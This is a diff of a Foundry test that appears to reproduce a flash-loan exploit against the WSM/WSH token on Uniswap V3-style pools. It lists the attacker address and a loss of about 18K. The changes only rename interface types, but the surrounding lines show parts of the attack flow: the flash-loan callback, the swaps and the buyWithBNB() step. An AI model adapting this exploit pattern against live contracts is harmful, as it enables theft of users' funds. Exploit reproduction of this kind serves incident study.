@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : 2_517_438_179_912_631_607_253_979 WSM ≈ 18K
 // Attacker : 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
@@ -17,9 +16,9 @@ import "./../interface.sol";
 
 contract WSM is Test {
 
-    Uni_Pair_V3 BNB_WSH_10000 = Uni_Pair_V3(payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E)));
-    Uni_Router_V3 routerv3_ = Uni_Router_V3(payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18)));
-    Uni_Pair_V3 BNB_WSH_3000 = Uni_Pair_V3(payable(address(0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a)));
+    IUniswapV3Pair BNB_WSH_10000 = IUniswapV3Pair(payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E)));
+    IUniswapV3Router routerv3_ = IUniswapV3Router(payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18)));
+    IUniswapV3Pair BNB_WSH_3000 = IUniswapV3Pair(payable(address(0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a)));
     address proxy_ = address(0xFB071837728455c581f370704b225ac9eABDfa4a);
 
     IERC20 wshToken_;
@@ -44,7 +43,7 @@ contract WSM is Test {
     function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
         console.log("2. bnb_wsh_10000 pool wsh balance after flashloan = ", wshToken_.balanceOf(address(this)));
 
-        Uni_Router_V3.ExactInputSingleParams memory args = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory args = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(wshToken_),
             tokenOut: address(bnbToken_),
             fee: 3000,
@@ -64,7 +63,7 @@ contract WSM is Test {
         console.log("5. wsh balance after attack function buyWithBNB() = ", wshToken_.balanceOf(address(this)));
         console.log("6. [ ============= ATTACK END ============= ]");
 
-        Uni_Router_V3.ExactInputSingleParams memory args2 = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory args2 = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(bnbToken_),
             tokenOut: address(wshToken_),
             fee: 3000,
